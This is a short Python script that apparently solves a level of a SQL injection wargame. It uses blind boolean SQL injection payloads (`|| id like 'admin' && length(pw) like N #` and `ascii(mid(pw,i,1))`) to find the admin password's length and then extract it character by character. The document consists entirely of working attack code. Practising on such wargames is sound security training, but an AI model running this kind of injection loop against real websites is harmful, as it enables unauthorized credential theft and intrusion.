import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?\
            pw=1234' || id like 'admin' %%26%%26 length(pw) like %d %%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break

pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?\
                pw=1234' || id like 'admin' %%26%%26 ascii(mid(pw,%d,1)) like %d %%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break